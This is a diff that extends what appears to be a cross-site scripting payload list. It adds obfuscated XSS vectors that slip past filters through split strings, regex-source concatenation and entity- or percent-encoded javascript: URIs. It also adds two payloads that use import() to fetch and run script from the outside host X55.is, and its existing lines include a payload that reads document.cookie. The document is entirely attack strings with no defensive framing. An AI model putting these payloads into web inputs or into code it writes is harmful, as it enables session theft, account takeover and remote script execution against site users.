@@ -5,3 +5,12 @@ x"//oNeRrOr=`/AmoloHT/`
 ""onerror=javascript:alert('AmoloHT')
 "><u>XSS By AmoloHT</u><marquee+onstart='alert(document.cookie)'>XSS
 <noscript><p title="</noscript><img src=x  onerror=alert(1)>">
+<svg onload=alert%26%230000000040"1")>
+<svg><set onbegin=d=document,b='`',d['loca'+'tion']='javascript&colon;aler'+'t'+b+domain+b>
+<svg><set onbegin=d=document,b=/`/.source,d[/loca/.source+/tion/.source]=/javascript&colon;aler/.source+/t/.source+b+domain+b>
+<a href=//X55.is autofocus onfocus=import(href)>
+<a href=javascript:'\74svg/onload\75alert\501\51\76'>
+<Img Src="//X55.is/> "OnError=import(src)//
+<Img Src="javascript:alert(1)> 1"OnError=location=src//
+javascript:&#37&#54&#49lert(1)
+javascript:%26%2337%26%2354%26%2349lert(1)
